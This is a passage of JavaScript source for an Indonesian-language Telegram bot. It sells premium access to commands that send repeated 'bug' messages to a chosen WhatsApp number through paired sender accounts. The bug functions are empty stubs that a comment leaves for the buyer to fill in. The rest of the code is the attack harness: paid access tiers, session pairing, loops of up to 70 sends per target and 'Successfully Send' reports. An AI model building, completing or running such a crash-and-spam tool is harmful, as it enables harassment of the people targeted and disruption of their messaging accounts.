  if (chatType !== "group" && chatType !== "supergroup") {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!")
  }
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const jumlah = parseInt(match[1])
  const unit = match[2] || 'd'
  let days = jumlah
  
  if (unit === 'h') days = jumlah / 24
  if (unit === 'm') days = jumlah / (24 * 30)
  
  if (days < 1) days = 1
  
  await addGroupPremium(chatId, Math.floor(days), userId)
  
  const chat = await bot.getChat(chatId)
  bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil ditambahkan ke premium selama ${jumlah}${unit === 'd' ? ' hari' : unit === 'h' ? ' jam' : ' bulan'}! Anggota grup dapat mengetik "add" untuk mendapatkan akses premium.`)
})

bot.onText(/\/delpremgrup/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  if (chatType !== "group" && chatType !== "supergroup") {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!")
  }
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const groupId = chatId.toString()
  const existingGroup = groupPremiumData.find(g => g.groupId === groupId)
  
  if (!existingGroup) {
    return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.")
  }
  
  removeGroupPremium(chatId)
  
  const chat = await bot.getChat(chatId)
  bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil dihapus dari daftar premium grup.`)
})

bot.onText(/\/listpremgrub/, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  if (chatType !== "group" && chatType !== "supergroup") {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!")
  }
  
  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
  }
  
  const groupId = chatId.toString()
  const group = groupPremiumData.find(g => g.groupId === groupId)
  
  if (!group) {
    return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.")
  }
  
  if (group.members.length === 0) {
    return bot.sendMessage(chatId, "📌 Belum ada member yang mendaftar premium di grup ini.")
  }
  
  let message = `<blockquote>📋 Daftar Premium Member</blockquote>\n`
  message += `Grup: ${group.groupTitle}\n`
  message += `Expires: ${moment(group.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n━━━━━━━━━━━━━━━━━━\n`
  
  group.members.forEach((member, index) => {
    const expires = moment(member.expiresAt).format('YYYY-MM-DD')
    message += `${index + 1}. ${member.username || `User ${member.userId}`}\n   ID: <code>${member.userId}</code>\n   Exp: ${expires}\n\n`
  })
  
  bot.sendMessage(chatId, message, { parse_mode: "HTML" })
})

bot.onText(/^add$/i, async (msg) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const username = msg.from.username || msg.from.first_name
  const chatType = msg.chat.type
  
  if (chatType !== "group" && chatType !== "supergroup") {
    return
  }
  
  const groupId = chatId.toString()
  const group = groupPremiumData.find(g => g.groupId === groupId)
  
  if (!group) {
    return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup. Hubungi admin untuk mendaftarkan grup.")
  }
  
  if (Date.now() > group.expiresAt) {
    return bot.sendMessage(chatId, "❌ Masa berlaku premium grup ini sudah habis. Hubungi admin untuk memperpanjang.")
  }
  
  if (isPremium(userId)) {
    return bot.sendMessage(chatId, `✅ @${username || userId} sudah memiliki akses premium!`, { parse_mode: "HTML" })
  }
  
  const remainingDays = Math.ceil((group.expiresAt - Date.now()) / (1000 * 60 * 60 * 24))
  
  await addMemberPremiumFromGroup(chatId, userId, username, remainingDays)
  
  bot.sendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" })
})

// ================= BUG FUNCTIONS (KOSONG - ISI SENDIRI) ================= //

async function brem(sock, target) { }
async function VisiFriend(sock, target) { }
async function OfferXForclose(sock, target) { }
async function bulldozerV2(sock, target) { }
async function xatanicaldelayv2(sock, target) { }
async function MbaPe(sock, target) { }

// ================= BOT COMMANDS BUG ================= //

function createBugSuccessMessage(targetNumber, bugType, date) {
  return `
<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>

◉ Target : ${targetNumber}
◉ Type Bug : ${bugType}
◉ Status : Successfully Send
◉ Date Now : ${date}

<blockquote>⸙ Spam Free at will</blockquote>`
}

function createCheckButton(targetNumber) {
  return {
    inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]]
  }
}

function getCurrentDate() {
  return new Date().toLocaleString('id-ID', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  })
}

async function checkUserAccess(userId, chatId, chatType, commandName) {
  const isOwnerUser = isOwner(userId)
  const isPremiumUser = isPremium(userId)
  
  if (isCommandBlocked(commandName)) {
    return false
  }
  
  if (isOwnerUser) return true
  
  if (chatType === "private" && !isPremiumUser) {
    await bot.sendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.")
    return false
  }
  
  return true
}

// Command bug
bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit")
  if (!hasAccess) return
  
  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /xploit 628xxx")
  
  const targetNumber = match[1].replace(/[^0-9]/g, "")
  const target = `${targetNumber}@s.whatsapp.net`
  const date = getCurrentDate()
  
  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
  
  const sock = sessions.values().next().value
  
  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), {
    parse_mode: "HTML",
    reply_markup: createCheckButton(targetNumber)
  })
  
  for (let i = 0; i < 70; i++) {
    await MbaPe(sock, target)
    await sleep(200)
  }
})

bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva")
  if (!hasAccess) return
  
  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Sanjiva 628xxx")
  
  const targetNumber = match[1].replace(/[^0-9]/g, "")
  const target = `${targetNumber}@s.whatsapp.net`
  const date = getCurrentDate()
  
  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
  
  const sock = sessions.values().next().value
  
  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), {
    parse_mode: "HTML",
    reply_markup: createCheckButton(targetNumber)
  })
  
  for (let i = 0; i < 10; i++) {
    await xatanicaldelayv2(sock, target)
    await sleep(200)
  }
})

bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova")
  if (!hasAccess) return
  
  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Stova 628xxx")
  
  const targetNumber = match[1].replace(/[^0-9]/g, "")
  const target = `${targetNumber}@s.whatsapp.net`
  const date = getCurrentDate()
  
  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
  
  const sock = sessions.values().next().value
  
  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), {
    parse_mode: "HTML",
    reply_markup: createCheckButton(targetNumber)
  })
  
  for (let i = 0; i < 7; i++) {
    await brem(sock, target)
    await sleep(200)
  }
})

bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms")
  if (!hasAccess) return
  
  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Chatms 628xxx")
  
  const targetNumber = match[1].replace(/[^0-9]/g, "")
  const target = `${targetNumber}@s.whatsapp.net`
  const date = getCurrentDate()
  
  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
  
  const sock = sessions.values().next().value
  
  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), {
    parse_mode: "HTML",
    reply_markup: createCheckButton(targetNumber)
  })
  
  for (let i = 0; i < 35; i++) {
    await VisiFriend(sock, target)
    await sleep(200)
  }
})

bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha")
  if (!hasAccess) return
  
  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Ganesha 628xxx")
  
  const targetNumber = match[1].replace(/[^0-9]/g, "")
  const target = `${targetNumber}@s.whatsapp.net`
  const date = getCurrentDate()
  
  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
  
  const sock = sessions.values().next().value
  
  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), {
    parse_mode: "HTML",
    reply_markup: createCheckButton(targetNumber)
  })
  
  for (let i = 0; i < 10; i++) {
    await bulldozerV2(sock, target)
    await sleep(200)
  }
})

bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const userId = msg.from.id
  const chatType = msg.chat.type
  
  const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug")
  if (!hasAccess) return
  
  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /sendbug 628xxx")
  
  const targetNumber = match[1].replace(/[^0-9]/g, "")
  const target = `${targetNumber}@s.whatsapp.net`
  const date = getCurrentDate()
  
  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
  
  const sock = sessions.values().next().value
  
  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), {
    parse_mode: "HTML",
    reply_markup: createCheckButton(targetNumber)
  })
  
  for (let i = 0; i < 35; i++) {
    await VisiFriend(sock, target)
    await sleep(200)
  }
})

// Command /reqpair
bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, thumbnailUrl, {
      caption: `<blockquote>Access Admin</blockquote>Please Buy Access Admin To The Owner!`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]]
      }
    })
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.")
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "")

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.")
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId)
  } catch (error) {
    console.error("Error in Connect:", error)
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.")
  }
})

// ================= START ================= //

process.on('unhandledRejection', (reason, promise) => {
  console.error(chalk.red('Unhandled Rejection at:', promise, 'reason:', reason));
});

process.on('uncaughtException', (error) => {
  console.error(chalk.red('Uncaught Exception:', error));
});

startAutoUpdateChecker();
startBot();
initializeWhatsAppConnections();